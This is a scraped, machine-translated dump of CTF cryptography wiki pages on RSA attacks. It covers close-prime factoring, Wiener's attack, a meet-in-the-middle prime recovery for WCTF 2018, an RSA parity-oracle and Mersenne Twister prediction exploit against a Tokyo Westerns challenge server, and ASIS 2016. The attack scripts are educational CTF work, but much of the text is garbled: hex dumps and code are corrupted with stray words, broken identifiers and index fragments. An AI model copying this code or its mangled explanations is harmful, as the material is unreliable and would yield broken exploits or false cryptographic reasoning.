\u279c level1 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 : c3: 26 : 59 : 69 : e1: ed: 74 : d2: e0: b4: 9a: d5: 6a: 2f: 2a: 9e: c3: 71 : ff: 13 : 4b: 10 : 37 : c0: 6f: 56 : 19 : 34 : c5: cb: 1f: 6d: c0: e3: 57 : 3b: 47 : c4: 11 :11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4: f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e: 4b: 01 : 53 : 4a: 67 : cb: 22 : 23 : 3b: 34 : 2e: af: 13 : ef: 93 :45: 16 : 2b: 00 : 9f: e0: 4b: d1: 90 : c9: 2c: 3f: d7: ee: 40 : f5: aa: 8c: e9: c2: 7b: f4: 36 : e3: 38 : 9d: 04 : 50 : db: a9: b7: 3f: 4b: 2a: d6: 87 : 2a: eb: 74 : 35 : 98 : 6a: 9c: e4: 52 : cb: 93 : 78 : 39 :83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc: 41 : 64 : 5e: 06 : yes: 83 : d0: 3b: 06 : 42 : 70 : 54 :35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18: 12 : 67 : a9: de: 37 : 7d: 44 : 65 : 5e: 68 : 0 : 78 : 39 : 3d: bb: 00 : 22 : 35 : 0e: a3: 94 : e6: 94 : 15 : 1a: 3d: 39 : c7: 50 : 0e: b1: 64 : a5: 29 : 40 : 69 : 94 : b0: 0d: 1a: ea: 9a: And it & #39;s not like that. 3e: 7d Exponent: 65537 ( 0x10001 ) Modulus = C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVan Kp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg /duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ OaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA VgYNWPxBZF4G2oPQOwZCcNo4U + BUNVPO3nlKv / U75VN / bBgSZ6neN31EZV5oCng5 PbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+ FQIDAQAB -----END PUBLIC KEY----- It seems that it is still not very big, break down again, and then try the factordb not, try yafu. The result is broken down. P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259 It can be found that these two numbers are very similar, and it may be that factordb does not implement this type of decomposition. Then the following operation is similar to level0. Just this time it is just a direct decryption, no filling, try to fill but wrong Get the password fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS . Continue to the next step to view the public key \u279c level2 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 1025 bit ) Modulus: 01 : ba: 0c: c2: 45 : b4: 5c: e5: b5: f5: 6c: d5: ca: a5: 90 : c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85: 8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33: f7: 2c: 2c: 0d: 21 : c2: 4a: d4: c5: f5: 09 : 94 : c2: 39 : 9d: 73 : e5: 04 : a2: 66 : 1d: 9c: 4b: 99 : d5: 38 : 44 : cd: 12 : a4: d0: 16 : 79 : f0: ac: 75 : f9: a4: ea: a8: 7c: 32 : 16 : 9 : 17 : d7: 7d: 80 : f: 60 : 29 : 64 : c7: ea: 50 : 30 : 63 : 76 :59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d: d5: 24 : 7d: 4f: a7: a1: f0: d5: 73 Exponent: 01 :00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7: 50 :5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd: 92 :70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf: 2d: b3: 0a: 6d: 02 : 7c: 56 : 61 : 7c: 7e: db: 28 : 66 : 9e: fb: 3d: 2f: 2c: 20 : 59 : 3c: 21 : ef: ff: 31 : 00 : 6a: 68 : 4a: 0a: 4c: 1a: a7: 09 : d5: 48 : 98 : c8: 1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc: ba: 31 : 4f: 5e: 07 : 83 : to: 0e: 7f: b9: 82 : a4: d2: 01 : ago: 68 : 29 : 6d: 66 : 7c: cf: 57 : b9: 4b Modulus = 1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN Ej2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm HZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq W7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC 3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5 + C37ZIihmnvs9LywgWTwh7 / 8xAGr7 p2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8 z1e5Sw == -----END PUBLIC KEY----- It is found that the private keys e and n are almost the same size. Considering that d is relatively small, use Wiener's Attack. Get d, of course, you can verify it again. \u279c level2 git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- At this time we decrypt the ciphertext and decrypt the code as follows from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode d = 29897859398360008828023114464512538800655735360280670512160838259524245332403 L with open ( './public.key' ) as f : key = RSA . importKey ( f ) n = key . n e = key . e def getprivatekey ( n , e , d ): priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level3.passwd.enc' ) as f : cipher = f . read () with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) getprivatekey ( n , e , d ) decrypt () Use the string wIe6ER1s_1TtA3k_e_t00_larg3 at the end to decrypt the compressed package, taking care to remove B. At this point, all decryption ends and a flag is obtained. 2018 WCTF RSA \u00b6 The basic description of the topic is Description: Encrypted message for user \"admin\": <<<320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901>>> admin public key: n = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927 e = 65537 Service: http://36.110.234.253 There is no way to get the binary online now. The binary obtained is now downloaded. We need to log in to the user's admin to download the corresponding generator. By simply reversing this generator, we can see that this program works like this. Iteratively decrypts the data after a certain fixed location** with a user-specified license (32 bytes), each set of 32 bytes, different from the key or the result. The key is generated by k_1=key k_1=key k_2 =sha256(k_1) k_2 =sha256(k_1) ... k_n=sha256(k_{n-1}) k_n=sha256(k_{n-1}) Among them, the fixed position is the position where the ENCRYPTED appears for the second time in the source file generator , and then offset by 32 bytes. _ENCRYPT_STR = ENCRYPTED_STR ; v10 = 0 ; ENCRYPTED_LEN = strlen ( ENCRYPTED_STR ); do { do ++ v9 ; while ( strncmp ( & file_contents [ v9 ], _ENCRYPT_STR , ENCRYPTED_LEN ) ); ++ v10 ; } while ( v10 <= 1 ); v11 = & file_start_off_32 [ loc2 + ENCRYPTED_LEN ]; v12 = loc2 + ENCRYPTED_LEN ; len = file_size - ( loc2 + ENCRYPTED_LEN ) - 32 ; decrypt ( & file_start_off_32 [ v12 ], & license , len ); sha256_file_start ( v11 , len , & output ); if ( ! memcmp ( & output , & file_contents [ v12 ], 0x20 u ) ) { v14 = fopen ( \"out.exe\" , \"wb\" ); fwrite ( v11 , 1 u , len , v14 ); fclose ( v14 ); sprintf ( byte_406020 , \"out.exe %s \" , argv [ 1 ]); system ( byte_406020 ); } At the same time, we need to ensure that the hash of the generated file is exactly the specified value. Since the file is an exe file at the end, we can think that the last file header is the standard exe file, so we don't need to know the original. The license file, and then we can write a python script to generate the exe. In the generated exe, we analyze the basic flow of the program as Read the license 2. Use the license as the seed to generate pq separately. 3. Use p,q to generate n,e,d. The vulnerability appears on the method of generating p, q, and the method of generating p and q is similar. If we carefully analyze the function of generating prime numbers, we can see that each prime number is generated in two parts. Generate 512 bits in the left half. Generate the right half of the 512 bits. The left and right 1024 bits are determined to determine whether it is a prime number. If the prime number is successful, it is not a prime number and continues to be generated. The way to generate each part is the same, in the way sha512 ( const1 | const2 | const3 | const4 | const5 | const6 | const7 | const8 | v9 ) v9 = r % 1000000007 Only v9 will change, but its scope is fixed. So if we say p,q is p=a*2^{512}+b p=a*2^{512}+b q=c*2^{512}+d q=c*2^{512}+d Then $ n = pq = a * 2 ^ {1024} + (ad + bc) * 2 ^ {512} + bd $ Then $ N equiv bd way 2 ^ {512} $ And since p and q are generated, a, b, c, and d have only 1000000007 possibilities. Furthermore, we can enumerate all the possibilities, first calculate the possible set of b as S, and we use the intermediate encounter attack to calculate n/d \\equiv b \\bmod 2^{512} n/d \\equiv b \\bmod 2^{512} Since b and d are both the mantissa of p, they must not be a multiple of 2, and there must be an inverse. Although this can be done, however, we can simply calculate the storage space. 64*1000000007 / 1024 / 1024 / 1024=59 64*1000000007 / 1024 / 1024 / 1024=59 That means 59 G is needed, too big, so we still need to think further $ N equiv bd way 2 ^ {64} $ In this way, our memory demand dropped to around 8 G in an instant. We still use the enumeration method to perform the operation. Second, we can't use python, python takes up too much space, so it needs to be written in c/c++. Enumerate all possible d to calculate the corresponding value n/d n/d If the corresponding value is in set S, then we can think of finding a pair of legal b and d, so we can recover half of p and q. After that, we $ B = n ^ {1024} and * 2 + (a + b) * 2 ^ {$ 512} Can get $ Frac {n} {2-b ^} = {512} and {512} * 2 ^ + b + for $ $ Frac {n} {2-bd} ^ {512} equiv ad + bc way 2 ^ {512} $ Similarly, we can calculate a and c so that we can fully recover p and q. In the process of solving the concrete, when we find part of p and q, we can find that because it is modulo 2^{64} 2^{64} , there may be a collision (but in fact, one is p, the other is q, just symmetry.). Below we find the v9 corresponding to b. Note: The space enumerated here takes up approximately 11 Gs (including the index), so choose the appropriate location. b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137 search 23000000 search 32000000 search 2b000000 search d000000 search 3a000000 search 1c000000 search 6000000 search 24000000 search 15000000 search 33000000 search 2c000000 search e000000 b64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175 search 1d000000 search 3b000000 search 7000000 search 16000000 search 25000000 search 34000000 In fact, after we actually get a part of p or q, the other part can be obtained by violent enumeration, because the calculation is almost the same, and the final result is ... hash 7000000 hash 30000000 p = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869 q = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283 plain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 hash 16000000 hash 25000000 hash b000000 hash 34000000 hash 1 a000000 ... \u279c 2018 - WCTF - rsa go to : ( master ) \u2717 python Python 2.7 . 14 ( default , Mar 22 2018 , 14 : 43 : 05 ) [ GCC 4.2 . 1 Compatible Apple LLVM 9.0 . 0 ( clang - 900.0 . 39.2 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> p = 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 >>> hex ( p )[ 2 :] . decode ( 'hex' ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\" , line 42 , in hex_decode output = binascii . a2b_hex ( input ) TypeError : Odd - length string >>> hex ( p )[ 2 : - 1 ] . decode ( 'hex' ) 'flag {fa6778724ed740396fc001b198f30313} ' Finally we got the flag. Please refer to the ctf-challenge repository for detailed utilization code. Related compilation instructions need to link related libraries. g++ exp2.cpp -std = c++11 -o main2 -lgmp -lcrypto -pthread Reference \u00b6 https://upbhack.de/posts/wctf-2018-writeup-rsa/","title":"Challenge Examples"},{"location":"crypto/asymmetric/rsa/rsa_complex/#rsa-complex-topic","text":"","title":"RSA Complex topic"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-tokyo-western-mixed-cipher","text":"The information given by the title is as follows: The length of time each interaction can last is approximately 5 minutes n is a certain 1024 bit in each interaction, but unknown, e is 65537 Encrypted flag with aes, neither key nor IV Each time the key is fixed, but the IV will be random each time You can use rsa and aes for encryption with the encrypt function, where each encryption will randomly random es of aes You can use decrypt to decrypt random ciphertext, but only know what the last byte is. You can use the print_flag to get the flag ciphertext sa encrypted aes key can be obtained using print_key This topic looks like a topic, but in fact it is 3 topics, which need to be solved step by step. Before that, we are ready to interact with the function def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 4 & quot ;) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline () [: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 1 & quot ;) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline () [: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 2 & quot ;) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" )","title":"2018 Tokyo Western Mixed Cipher"},{"location":"crypto/asymmetric/rsa/rsa_complex/#gcd-attack-n","text":"In the first step, we need to calculate the n that is not given, because we can use the encrypt function to rsa encrypt the plaintext x we input, then we can use the nature of the divisibility to calculate n. Because x ^ e = c mod n So n | x ^ e - c We can construct enough x to calculate the most x ^ e - c to calculate the greatest common divisor and get n. def get_n(io): rsa_c,aes_c=encrypt_io(io,long_to_bytes(2)) n=pow(2,65537)-rsa_c for i in range(3,6): rsa_c, aes_c = encrypt_io(io, long_to_bytes(i)) n=primefac.gcd(n,pow(i,65537)-rsa_c) return n Can use encryption to check def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , & quot ; 123 & quot ;) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False","title":"GCD attack n"},{"location":"crypto/asymmetric/rsa/rsa_complex/#rsa-parity-oracle","text":"Using the last byte of leave, we can choose to ciphertext attack, use RSA parity oracle to reply to the key of aes def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : Print LB , UB tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : UB = ( Ib + UB ) / 2 k + = 1 print ub , len ( long_to_bytes ( ub )) return ub","title":"RSA parity oracle"},{"location":"crypto/asymmetric/rsa/rsa_complex/#prng-predict","text":"Here we can decrypt the contents of the 16 bytes of the flag, but the first 16 bytes without the IV can not be decrypted. At this point we can find that the random number used by IV generation uses getrandbits, and we can get enough random numbers, then we can make the PRNG prediction, and then get the random number directly. Here I use a ready-made java for Predict of PRNG. public class Main { static int [] state ; static int currentIndex ; 40 huo public static void main ( String [] args ) { state = new int [ 624 ] ; currentIndex = 0 ; // initialize(0); // for (int i = 0; i < 5; i++) { // System.out.println(state[i]); // } // for (int i = 0; i < 5; i++) { // System.out.println(nextNumber()); // } if ( args . length != 624 ) { System . err . println ( \"must be 624 args\" ); System . exit ( 1 ); } int [] arr = new int [ 624 ] ; for ( int i = 0 ; i < args . length ; i ++ ) { arr [ i ] = Integer . parseInt ( args [ i ] ); } breaking ( scarring ); for ( int i = 0 ; i < 6240 huo4 ; i ++ ) { System . out . println ( state [ i ] ); } // System.out.println(\"currentIndex \" + currentIndex); // System.out.println(\"state[currentIndex] \" + state[currentIndex]); // System.out.println(\"next \" + nextNumber()); // want -2065863258 } static void nextState () { // Iterate through the state for ( int i = 0 ; i < 624 ; i ++ ) { // y is the first bit of the current number, // and the last 31 bits of the next number int y = ( state [ i ] & 0x80000000 ) + ( state [ ( i + 1 ) % 624 ] & 0x7fffffff ); // first bitshift y by 1 to the right int next = y >>> 1 ; // xor it with the 397th next number next ^= state [ ( i + 397 ) % 624 ] ; // if y is odd, xor with magic number if (( y & 1L ) == 1L ) { next ^= 0x9908b0df ; } // now we have the result state [ i ] = next ; } } static int nextNumber () { currentIndex ++ ; int tmp = state [ currentIndex ] ; tmp ^= ( tmp >>> 11 ); tmp ^= ( tmp << 7 ) & 0x9d2c5680 ; tmp ^= ( tmp << 15 ) & 0xefc60000 ; tmp ^= ( tmp >>> 18 ); return tmp ; } static void initialize ( int seed ) { // http://code.activestate.com/recipes/578056-mersenne-twister/ // global MT // global bitmask_1 // MT[0] = seed // for i in xrange(1,624): // MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] >> 30) + i)) & bitmask_1 // copied Python 2.7's impl (probably uint problems) state [ 0 ] = seed ; for ( int i = 1 ; i < 624 ; i ++ ) { state [ i ] = (( 1812433253 * state [ i - 1 ] ) ^ (( state [ i - 1 ] >> 30 ) + i )) & 0xffffffff ; } } static int unBitshiftRightXor ( int value , int shift ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 << ( 32 - shift )) >>> ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= part >>> shift ; // add the part to the result result |= part ; i ++ ; } return result ; } static int unBitshiftLeftXor ( int value , int shift , int mask ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 >>> ( 32 - shift )) << ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= ( part << shift ) & mask ; // add the part to the result result |= part ; i ++ ; } return result ; } static void rev ( int [] nums ) { for ( int i = 0 ; i < 624 ; i ++ ) { int value = nums [ i ] ; value = unBitshiftRightXor ( value , 18 ); value = unBitshiftLeftXor ( value , 15 , 0xefc60000 ); value = unBitshiftLeftXor ( value , 7 , 0x9d2c5680 ); value = unBitshiftRightXor ( value , 11 ); state [ i ] = value ; } } } Wrote a python and call java directly from Crypto.Util.number import long_to_bytes,bytes_to_long def encrypt_io (io, p): io.read_until(\"4: get encrypted keyn\") io.writeline ( &quot;1&quot;) io.read_until(\"input plain text: \") io.writeline(p) io.read_until(\"RSA: \") rsa_c = int (io.readline () [: - 1], 16) io.read_until(\"AES: \") aes_c=io.readline()[:-1].decode(\"hex\") return rsa_c,aes_c import subprocess import random def get_iv(io): rsa_c, aes_c = encrypt_io (io, &quot;1&quot;) return bytes_to_long(aes_c[0:16]) def splitInto32(w128): w1 = w128 & (2**32-1) w2 = (w128 >> 32) & (2**32-1) w3 = (w128 &gt;&gt; 64) &amp; (2 ** 32-1) w4 = (w128 >> 96) return w1,w2,w3,w4 def sign(iv): # converts a 32 bit uint to a 32 bit signed int if(iv&0x80000000): iv = -0x100000000 + iv return iv def get_state(io): numbers=[] for i in range(156): print i numbers.append(get_iv(io)) observedNums = [sign(w) for n in numbers for w in splitInto32(n)] o = subprocess.check_output([\"java\", \"Main\"] + map(str, observedNums)) stateList = [int(s) % (2 ** 32) for s in o.split()] r = random.Random() state = (3, tuple(stateList + [624]), None) r.setstate(state) return r.getrandbits(128)","title":"PRNG Predict"},{"location":"crypto/asymmetric/rsa/rsa_complex/#exp","text":"The overall attack code is as follows: from zio import * import import from Crypto.Util.number import long_to_bytes , bytes_to_long target = ( \"crypto.chal.ctf.westerns.tokyo\" , 5643 ) e = 65537 def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 4 & quot ;) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline () [: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 1 & quot ;) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline () [: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 2 & quot ;) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" ) def get_n ( io ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( 2 )) n = pow ( 2 , 65537 ) - rsa_c for i in range ( 3 , 6 ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( i )) n = primefac . gcd ( n , pow ( i , 65537 ) - rsa_c ) return n def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , & quot ; 123 & quot ;) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False import gmpy2 def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : Print LB , UB tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : UB = ( Ib + UB ) / 2 k + = 1 print ub , len ( long_to_bytes ( ub )) return ub io = zio ( target , timeout = 10000 , print_read = COLORED ( NONE , 'red' ), print_write = COLORED ( NONE , 'green' )) n = get_n ( io ) print check_n ( io , n ) c = get_enc_key ( io ) print len ( decrypt_io ( io , c )) == 16 m = guess_m ( io , n , c ) for i in range ( m - 50000 , m + 50000 ): if pow ( i , e , n ) == c : aeskey = i print long_to_bytes ( aeskey )[ - 1 ] == decrypt_io ( io , c )[ - 1 ] print \"found aes key\" , hex ( aeskey ) import fuck_r next_iv = fuck_r . get_state ( io ) print \"##########################################\" print next_iv print aeskey io . interact ()","title":"EXP"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2016-asis-find-the-flag","text":"Here we take the example of Find the flag in the ASIS 2016 online game. The file is extracted and has a ciphertext, a public key, and a py script. Take a look at the public key. \u279c RSA openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 : d8: e2: 4c: 12 : b7: b9: 9e: fe: 0a: 9b: c0: 4a: f5: 8a: 2a: 94 : 42 : 69 : b4: 92 : b7: 37 : 6d: f1: 29 : 20 : 61 : b9 Exponent: 12405943493775545863 ( 0xac2ac3e0ca0f5607 ) Modulus = D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9 Such a small N N , first break it down. p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 Look at the py script again. #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 flag = open ( 'flag' , 'r' ) . read () * 30 def ext_rsa_encrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) pubkey = RSA . construct (( long ( n ), long ( e ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) return enc except : p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) f = open ( 'pubkey.pem' , 'w' ) f . write ( pubkey . exportKey ()) g = open ( 'flag.enc' , 'w' ) g . write ( ext_rsa_encrypt ( p , q , e , flag )) The logic is very simple, read the flag and repeat 30 times for the ciphertext. Randomly take p p and q q , generate a public key, write pubkey.pem , encrypt it with the ext_rsa_encrypt function in the script, and finally write the ciphertext to flag.enc . Try decryption, suggest that the ciphertext is too long, and then look at the encryption function. When the encryption fails, the function will jump to the exception handling and re-take the larger p p and q q with a certain algorithm until the encryption succeeds. Then we just need to write a corresponding decryption function. #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 def ext_rsa_decrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( privatekey ) de_error = & #39;&#39; enc = key . decrypt ( msg . decode ( 'base64' ), de_error ) return enc except Exception as error : print error p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 n = p * q e = 12405943493775545863 # pubkey = RSA.construct((long(n), long(e))) # f = open('pubkey.pem', 'w') # f.write(pubkey.exportKey()) g = open ( 'flag.enc' , 'r' ) msg = g . read () flag = ext_rsa_decrypt ( p , q , e , msg ) print flag Get the flag ASIS {F4ct0R__N_by_it3rat! Ng!}","title":"2016 ASIS Find the flag"},{"location":"crypto/asymmetric/rsa/rsa_complex/#sctf-rsa1","text":"Here we take SCTF RSA1 as an example. After decompressing the compressed package, we get the following file. \u279c level0 git: ( master ) \u2717 ls -al Total dosage 4drwxrwxrwx 1 root root 0 7\u6708 30 16 :36 . drwxrwxrwx 1 root root 0 7\u6708 30 16 :34 .. -rwxrwxrwx 1 root root 349 5\u6708 2 2016 level1.passwd.enc -rwxrwxrwx 1 root root 2337 5\u6708 6 2016 level1.zip -rwxrwxrwx 1 root root 451 5\u6708 2 2016 public.key Try to unzip the level1.zip now requires a password. Then according to level1.passwd.enc, we should decrypt the file to get the corresponding password. View public key \u279c level0 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8: 89 :d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c: 70 : 87 : 24 : D8: 98 : 3C: F3: 33 : 1c: BA: 5 : 61 : c2: EC: 2c: 5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6: bb: a3: 7d: 56 : 93 : 99 : 4d: 7e: 4c: 2f: aa: 60 : 7b: 3e: c8: 